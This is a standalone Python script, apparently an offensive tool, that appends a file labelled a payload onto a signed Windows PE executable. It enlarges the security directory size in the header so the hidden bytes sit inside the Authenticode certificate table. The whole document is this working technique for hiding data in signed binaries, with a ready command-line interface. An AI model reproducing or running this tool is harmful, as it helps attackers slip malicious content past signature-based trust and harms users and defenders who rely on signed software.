import pefile
import argparse


def merge_data_into_file(file_path, data_path, new_name):
    print("[*] Reading signed input file")
    ffd = open(file_path, 'rb')
    file_content = ffd.read()
    ffd.close()
    print("[*] Reading payload content")
    dfd = open(data_path, 'rb')
    data_content = dfd.read()
    dfd.close()
    print("[*] Size of data to be written -", hex(len(data_content)))
    print("[*] Merging data in memory")
    new_content = file_content + data_content
    padding = b"\x00" * (4 - len(data_content) % 4)
    new_content += padding
    pe = pefile.PE(data=new_content)
    data_directory = pe.OPTIONAL_HEADER.DATA_DIRECTORY
    entry_security = [d for d in data_directory if d.name == 'IMAGE_DIRECTORY_ENTRY_SECURITY'][0]
    if entry_security.Size == 0:
        print("[*] No signature found in executable")
        print("[*] Exiting")
        return
    new_signature_size = entry_security.Size + len(data_content) + len(padding)
    print(f"[*] Changing signature size header from {hex(entry_security.Size)} to {hex(new_signature_size)}")
    print("[*] Old security directory:")
    print("\t", entry_security)
    for d in data_directory:
        if d.name == 'IMAGE_DIRECTORY_ENTRY_SECURITY':
            d.Size = new_signature_size
    print("[*] New security directory:")
    print("\t", entry_security)
    pe.write(new_name)
    pe.close()
    print("[*] Finished")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('file', help='File with certificate to hide data', metavar='<file path>')
    parser.add_argument('data', help='Data to hide in file\'s certificate', metavar='<data path>')
    parser.add_argument('out', help='Name of output file', metavar='<output>')
    args = parser.parse_args()
    merge_data_into_file(args.file, args.data, args.out)


if __name__ == "__main__":
    main()
